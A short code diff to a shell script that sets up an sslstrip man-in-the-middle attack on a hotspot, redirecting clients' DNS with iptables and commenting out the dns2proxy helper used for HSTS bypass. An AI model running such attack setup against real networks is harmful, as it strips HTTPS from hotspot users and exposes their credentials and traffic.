@@ -16,9 +16,10 @@ function enable_sslstrip()
 	iptables -t nat -A PREROUTING -i $interface_hotspot -p udp --dport 53 -j DNAT --to $interface_hotspot_ip
 	#start dns2proxy on interface_hotspot (sslstrip should be started before, to allow dns2proxy to revert hsts changes)
 	
-	echo "Start dns2proxy for sslstrip"
-	python $SCRIPTPATH/dns2proxy/dns2proxy_no_debug.py $interface_hotspot $LOGDIR > /dev/null&
-	#python dns2proxy_no_debug.py $interface_hotspot&
+#	echo "Start dns2proxy for sslstrip"
+#	python $SCRIPTPATH/dns2proxy/dns2proxy_no_debug.py $interface_hotspot $LOGDIR #> /dev/null&
+	
+	
 	##########
 	# sslstrip (with hsts bypass, dns2proxy needed to revert changes)
 	# works only if the user starts with a non https entry-point
@@ -49,7 +50,7 @@ function disable_sslstrip()
 
 	# kill unneeded procs
 	kill $(ps -aux | grep sslstrip.py | grep -v -e grep | awk '{print $2}') 2> /dev/null
-	kill $(ps -aux | grep dns2proxy_no_debug.py | grep -v -e grep | awk '{print $2}') 2> /dev/null
+	#kill $(ps -aux | grep dns2proxy_no_debug.py | grep -v -e grep | awk '{print $2}') 2> /dev/null
 }
 
 enable_sslstrip
